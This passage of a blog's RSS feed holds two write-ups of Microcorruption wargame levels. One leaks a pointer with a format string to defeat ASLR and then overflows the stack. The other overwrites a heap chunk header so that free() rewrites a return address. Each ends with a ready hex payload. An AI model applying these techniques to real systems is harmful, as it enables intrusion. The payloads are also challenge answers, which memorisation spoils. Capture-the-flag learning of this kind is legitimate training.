        <pubDate>Sun, 27 Jan 2019 14:47:11 +1100</pubDate>
        <link>zijunh.github.io/2019/01/bangalore/</link>
        <guid isPermaLink="true">zijunh.github.io/2019/01/bangalore/</guid>
        
        <category>microcorruption</category>
        
        <category>solution</category>
        
        <category>wargames</category>
        
        
        <category>microcorruption</category>
        
      </item>
    
      <item>
        <title>Microcorruption - Vladivostok: Write-up</title>
        <description>&lt;h2 id=&quot;the-input&quot;&gt;The input&lt;/h2&gt;

&lt;p&gt;For this particular problem, the user can only input two string in the form of &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt;. The maximum accepted length for &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; is 0x8 bytes, and the maximum accepted length is &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt; is 0x14 bytes .&lt;/p&gt;

&lt;h2 id=&quot;the-exploit&quot;&gt;The exploit&lt;/h2&gt;

&lt;p&gt;Again, we are able to look at the function names and notice there is a function containing &lt;code class=&quot;highlighter-rouge&quot;&gt;aslr&lt;/code&gt;. Though it looks complicated, we are going to ignore how the function works on a microscopic level, and use our knowledge of ASLR to solve the problem. ASLR stands for address space layout randomisation. It involves placing the libraries, stack, and heap (doesn’t exist in this case) at random locations within memory. It serves to protect program when the exploiter controls a return pointer. As the locations are randomised, she/he will not know where the desired code fragment is stored.&lt;/p&gt;

&lt;p&gt;However, this technique is easily countered by knowing the location of one function in memory. This way, the location of the desired code fragment can be calulated by adding the offset to the exposed location, and the offset is easily determined by looking at the machine code.&lt;/p&gt;

&lt;p&gt;In this example, this is fortunately the case. A &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; function exists, which can be exploited using &lt;code class=&quot;highlighter-rouge&quot;&gt;%x&lt;/code&gt; to reveal the content on the stack. Trying with an input of &lt;code class=&quot;highlighter-rouge&quot;&gt;%x%x%x%x&lt;/code&gt; provides an output of &lt;code class=&quot;highlighter-rouge&quot;&gt;0000xxxx00000000&lt;/code&gt;, where &lt;code class=&quot;highlighter-rouge&quot;&gt;xxxx&lt;/code&gt; is random, hinting this may be a pointer to another function. Pausing the program execution and comparing the assembly code with the initial state of the program, we can identify it as the start of the &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; function.&lt;/p&gt;

&lt;p&gt;Controlling the return pointer is easy through a buffer overflow of the input string. A small trial-and-error reveals the return pointer of the function is stored 8 bytes after the start of the input.&lt;/p&gt;

&lt;p&gt;As &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; function location can be exposed in the program, we have to consider what shell code we want to inject. As the location of the stack is randomised separately, it is difficult to determine the stack loction, thus prevents use from including custom code in the input. What we do have access to, however, is the content of the stack. Therefore, we are should be able to push 0x7f, the door opening code, onto the stack and call &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt;, which opens the door.&lt;/p&gt;

&lt;p&gt;Examination of the code reveals &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt; is 0x180 bytes after the start of &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt;. Pushing 0x7f is done by appending 2 bytes of padding and &lt;code class=&quot;highlighter-rouge&quot;&gt;7f&lt;/code&gt; at the end of the input string.&lt;/p&gt;

&lt;h2 id=&quot;the-solution&quot;&gt;The solution&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; should print a string with the following format:&lt;/p&gt;

&lt;p&gt;&amp;lt;–2 bytes of 0–&amp;gt;&lt;br /&gt;
&amp;lt;–2 byte address of &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt;–&amp;gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt; has the following format:&lt;/p&gt;

&lt;p&gt;&amp;lt;–8 byte padding–&amp;gt;&lt;br /&gt;
&amp;lt;–2 byte &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; address + 0x180–&amp;gt;&lt;br /&gt;
&amp;lt;–2 byte padding–&amp;gt;&lt;br /&gt;
&amp;lt;–7f–&amp;gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%x%x
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1122334455667788c2ad11227f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;P.S.: Apparently there exists a 14 byte and a &lt;strong&gt;9&lt;/strong&gt; byte solution. If anyone can explain how please tell me.&lt;/p&gt;

&lt;h2 id=&quot;read-more&quot;&gt;Read more&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://security.stackexchange.com/questions/22989/how-leaking-pointers-to-bypass-dep-aslr-works&quot;&gt;How “leaking pointers” to bypass DEP/ASLR works&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 24 Jan 2019 14:16:29 +1100</pubDate>
        <link>zijunh.github.io/2019/01/vladivostok/</link>
        <guid isPermaLink="true">zijunh.github.io/2019/01/vladivostok/</guid>
        
        <category>microcorruption</category>
        
        <category>solution</category>
        
        <category>wargames</category>
        
        
        <category>microcorruption</category>
        
      </item>
    
      <item>
        <title>Microcorruption - Algiers: Write-up</title>
        <description>&lt;h2 id=&quot;the-input&quot;&gt;The input&lt;/h2&gt;

&lt;p&gt;For this particular problem, the user can only input two string in the form of &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt;. The maximum accepted length is 0x30 bytes.&lt;/p&gt;

&lt;h2 id=&quot;the-exploit&quot;&gt;The exploit&lt;/h2&gt;

&lt;p&gt;Looking at the names of the functions, we immediately see &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt;. Both functions are commonly used to allocate memory on the heap. This gives a vague idea that the exploitation will be heap related. &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; are both called twice, once for &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; and once for &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc&lt;/code&gt; is called before user input, and &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; is called just before the program finishes, suggesting &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; is going to be the target of the exploitation.&lt;/p&gt;

&lt;p&gt;In this example, heap is implemented as a linked list, and each element has the following structure. The header is the same for both freed and in use memory. This implementation is similar to that of &lt;code class=&quot;highlighter-rouge&quot;&gt;glibc&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;element&amp;gt;
    &amp;lt;6 byte header&amp;gt;
        &amp;lt;2 byte pointer to the previous block&amp;gt;
        &amp;lt;2 byte pointer to the next block&amp;gt;
        &amp;lt;2 byte size, with the least significant bit being indicating IN_USE&amp;gt;
    &amp;lt;content&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For both &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt;, the size of &lt;code class=&quot;highlighter-rouge&quot;&gt;content&lt;/code&gt; is only 0x10, which is smaller than the allowed input size of 0x30. As both blocks are allocated next to each other, with &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt; being directly after &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt;, the heap can be overflowed to overwrite the header for &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt;. Furthermore, &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; is conveniently called on &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt; first (the second input), allowing the overwritten header to be used immediately.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; function vaguely resembles the following code:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r15 = &amp;amp;freeing chunk
r13 = r15.size
r14 = r15.prev
r12 = r14.size
if (!r14.IN_USE){
    r12 += 6
    r12 += r13 
    r14.size = r12
    r14.next = r15.next
    r13 = r15.next
    r13.prev = r14
    r15 = r15.prev
}
r14 = r15.next
r13 = r14.size 
if (!r14.IN_USE){
    r13 += r15.size
    r13 += 6
    r15.size = r13
    r14.next = r15.next
    r14.prev = r15
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We aim to overwrite the return pointer (at 0x4394) of &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; to direct it to our desired location and execute custom code. This can be done by utilising the line &lt;code class=&quot;highlighter-rouge&quot;&gt;r13.prev = r14&lt;/code&gt;, where &lt;code class=&quot;highlighter-rouge&quot;&gt;r13 = r15.next&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;r14 = r15.prev&lt;/code&gt;. Thus we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;r15.prev&lt;/code&gt; as the pointer to the custom code and &lt;code class=&quot;highlighter-rouge&quot;&gt;r15.next&lt;/code&gt; as the position to be overwritten (the return pointer). However, it is important to note that the first 6 bytes after &lt;code class=&quot;highlighter-rouge&quot;&gt;prev&lt;/code&gt; will be changed later in the code as it is treated as a header for a chunk, so a 6 byte padding is required before out custom code. Though that header will be treated as code and executed, it is not important as it is likely it will have not severe effect.&lt;/p&gt;

&lt;h2 id=&quot;the-solution&quot;&gt;The solution&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt; is left blank and the &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; has the following structure:&lt;/p&gt;

&lt;p&gt;&amp;lt;–8 byte padding–&amp;gt;
&amp;lt;–8 byte payload–&amp;gt;
&amp;lt;–2 byte input address–&amp;gt;
&amp;lt;–2 byte return address–&amp;gt;&lt;/p&gt;

&lt;p&gt;and the following solution:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaaaaaaaaaaaaaaa30127f00b012b6460e249443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;8 bytes of padding is required, because when &lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt; is used, a 4 byte instruction will appear.&lt;/p&gt;
</description>
        <pubDate>Wed, 23 Jan 2019 15:37:10 +1100</pubDate>
        <link>zijunh.github.io/2019/01/algiers/</link>
        <guid isPermaLink="true">zijunh.github.io/2019/01/algiers/</guid>
        
        <category>microcorruption</category>
        
        <category>solution</category>
        
        <category>wargames</category>
        
        
        <category>microcorruption</category>
        
      </item>
    
  </channel>
</rss>
